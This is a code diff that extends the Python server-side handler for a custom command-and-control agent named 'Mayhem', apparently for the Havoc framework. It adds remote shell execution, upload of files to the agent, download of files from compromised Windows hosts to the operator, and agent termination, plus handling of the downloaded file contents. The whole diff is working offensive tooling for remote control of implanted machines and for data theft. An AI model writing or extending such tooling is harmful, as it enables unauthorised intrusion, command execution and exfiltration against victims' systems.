@@ -1,4 +1,5 @@
 import os
+from base64 import b64decode
 
 from dotenv import load_dotenv
 
@@ -11,6 +12,79 @@ REGISTER_AGENT         = 0x187
 GET_JOB                = 0x143
 NO_JOB                 = 0x144
 OUTPUT_AGENT           = 0x188
+COMMAND_SHELL          = 0x152
+COMMAND_UPLOAD         = 0x153
+COMMAND_DOWNLOAD       = 0x154
+COMMAND_EXIT           = 0x155
+
+class MayhemShell(Command):
+    Name        = "shell"
+    Description = "executes a shell command"
+    Help        = "shell [command]"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = [
+        CommandParam("command", False, False),
+    ]
+    CommandId   = COMMAND_SHELL
+
+    def job_generate(self, arguments: dict) -> bytes:
+        packer = Packer()
+        packer.add_int(self.CommandId)
+        packer.add_data(arguments["command"])
+        return packer.get_buffer()
+
+class MayhemUpload(Command):
+    Name        = "upload"
+    Description = "upload a file to the agent"
+    Help        = "upload [local_file] [remote_path]"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = [
+        CommandParam("local_file", True, False),
+        CommandParam("remote_path", False, False),
+    ]
+    CommandId   = COMMAND_UPLOAD
+
+    def job_generate(self, arguments: dict) -> bytes:
+        packer = Packer()
+        packer.add_int(self.CommandId)
+        packer.add_data(arguments["remote_path"])
+        file_content = open(arguments["local_file"], "rb").read()
+        packer.add_data(file_content)
+        return packer.get_buffer()
+
+class MayhemDownload(Command):
+    Name        = "download"
+    Description = "download a file from the agent"
+    Help        = "download [remote_path]"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = [
+        CommandParam("remote_path", False, False),
+    ]
+    CommandId   = COMMAND_DOWNLOAD
+
+    def job_generate(self, arguments: dict) -> bytes:
+        packer = Packer()
+        packer.add_int(self.CommandId)
+        packer.add_data(arguments["remote_path"])
+        return packer.get_buffer()
+
+class MayhemExit(Command):
+    Name        = "exit"
+    Description = "terminate the agent"
+    Help        = "exit"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = []
+    CommandId   = COMMAND_EXIT
+
+    def job_generate(self, arguments: dict) -> bytes:
+        packer = Packer()
+        packer.add_int(self.CommandId)
+        return packer.get_buffer()
+
 class Mayhem(AgentType):
     Name = "Mayhem"
     Author = "me1n + Hera + Cushz"
@@ -20,7 +94,7 @@ class Mayhem(AgentType):
     Arch = ["x64"]
     Formats = [{"Name": "Windows Executable", "Extension": "exe"}]
     BuildingConfig = {"Sleep": "10"}
-    Commands = []
+    Commands = [MayhemShell(), MayhemUpload(), MayhemDownload(), MayhemExit()]
 
     #builds the payload that the client requests. For example, if you select exe paylaod from ui, this builds the exe for you.
     def generate (self, config: dict) -> None:
@@ -115,11 +189,16 @@ class Mayhem(AgentType):
                 print(f"Tasks: {Tasks.hex()}")
                 return Tasks
             elif Command == OUTPUT_AGENT:
-
                 Output = response_parser.parse_str()
                 print("Output: \n" + Output)
+                self.console_message(AgentID, "Done", "Recieved Output:", Output)
 
-                self.console_message(AgentID, "Done", "Recieved Output:",Output)
+            elif Command == COMMAND_DOWNLOAD:
+                FileName = response_parser.parse_str()
+                FileContent = response_parser.parse_str()
+                print(f"Download: {FileName} ({len(FileContent)} bytes)")
+                self.console_message(AgentID, "Done", f"Downloaded {FileName}", f"{len(FileContent)} bytes")
+                self.download_file(AgentID, FileName, len(FileContent), FileContent)
             else:
                 self.console_message(AgentID, "Error", "Command not found: %4x" % Command, "")
         return b''
